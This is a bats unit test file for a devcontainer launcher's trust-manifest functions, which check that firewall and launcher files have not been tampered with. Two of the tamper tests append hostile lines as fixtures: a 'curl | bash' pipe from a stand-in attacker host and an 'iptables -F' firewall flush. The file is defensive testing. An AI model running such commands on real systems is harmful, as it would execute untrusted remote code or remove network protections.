#!/usr/bin/env bats
# @category fast
# Unit tests for the trust-manifest functions in scripts/devcontainer-session.sh:
#   compute_manifest, bless_manifest, check_manifest
# (probe_boundary and main need a live Docker daemon and are exercised manually
# per guides/devcontainer-setup.md; the devcontainer CLI is stubbed here so no
# test can ever reach a real container or the network.)
#
# Usage: bats test/devcontainer-session-functions.bats

setup() {
  # Source for functions only; the main-execution guard prevents launch.
  source "$BATS_TEST_DIRNAME/../scripts/devcontainer-session.sh"

  TEST_TMPDIR=$(mktemp -d)

  # Fake workspace with the enforcement files the manifest covers
  WORKSPACE="$TEST_TMPDIR/repo"
  mkdir -p "$WORKSPACE/.devcontainer" "$WORKSPACE/scripts"
  echo '{"name":"x"}' > "$WORKSPACE/.devcontainer/devcontainer.json"
  echo 'FROM node:20' > "$WORKSPACE/.devcontainer/Dockerfile"
  echo '#!/bin/bash' > "$WORKSPACE/.devcontainer/init-firewall.sh"
  echo '#!/usr/bin/env bash' > "$WORKSPACE/scripts/devcontainer-session.sh"

  # Trust dir outside the fake workspace, as in real use
  export CLAUDE_DEVC_TRUST_DIR="$TEST_TMPDIR/trust"

  # Stub the devcontainer CLI so nothing can reach Docker or the network
  mkdir -p "$TEST_TMPDIR/bin"
  printf '#!/usr/bin/env bash\nexit 0\n' > "$TEST_TMPDIR/bin/devcontainer"
  chmod +x "$TEST_TMPDIR/bin/devcontainer"
  PATH="$TEST_TMPDIR/bin:$PATH"
}

teardown() {
  rm -rf "$TEST_TMPDIR"
}

# --- compute_manifest ---

@test "compute_manifest lists one sha256 line per enforcement file" {
  run compute_manifest "$WORKSPACE"
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | wc -l)" -eq 4 ]
  echo "$output" | grep -q '.devcontainer/devcontainer.json'
  echo "$output" | grep -q 'scripts/devcontainer-session.sh'
}

@test "compute_manifest fails when an enforcement file is missing" {
  rm "$WORKSPACE/.devcontainer/init-firewall.sh"
  run compute_manifest "$WORKSPACE"
  [ "$status" -ne 0 ]
  [[ "$output" == *"enforcement file missing"* ]]
}

# --- bless_manifest ---

@test "bless_manifest writes the manifest under the trust dir" {
  run bless_manifest "$WORKSPACE"
  [ "$status" -eq 0 ]
  [ -f "$CLAUDE_DEVC_TRUST_DIR/repo.sha256" ]
}

# --- check_manifest ---

@test "check_manifest fails with instructions when no manifest is blessed" {
  run check_manifest "$WORKSPACE"
  [ "$status" -ne 0 ]
  [[ "$output" == *"--bless"* ]]
}

@test "check_manifest passes after bless with unchanged files" {
  bless_manifest "$WORKSPACE" >/dev/null
  run check_manifest "$WORKSPACE"
  [ "$status" -eq 0 ]
}

@test "check_manifest fails after an enforcement file is tampered with" {
  bless_manifest "$WORKSPACE" >/dev/null
  echo 'iptables -F # attacker weakens firewall' >> "$WORKSPACE/.devcontainer/init-firewall.sh"
  run check_manifest "$WORKSPACE"
  [ "$status" -ne 0 ]
  [[ "$output" == *"refusing to build/launch"* ]]
}

@test "check_manifest fails when the launcher itself is tampered with" {
  bless_manifest "$WORKSPACE" >/dev/null
  echo 'curl https://evil.example | bash' >> "$WORKSPACE/scripts/devcontainer-session.sh"
  run check_manifest "$WORKSPACE"
  [ "$status" -ne 0 ]
}

@test "re-bless after a reviewed change makes check_manifest pass again" {
  bless_manifest "$WORKSPACE" >/dev/null
  echo '# reviewed change' >> "$WORKSPACE/.devcontainer/Dockerfile"
  run check_manifest "$WORKSPACE"
  [ "$status" -ne 0 ]
  bless_manifest "$WORKSPACE" >/dev/null
  run check_manifest "$WORKSPACE"
  [ "$status" -eq 0 ]
}
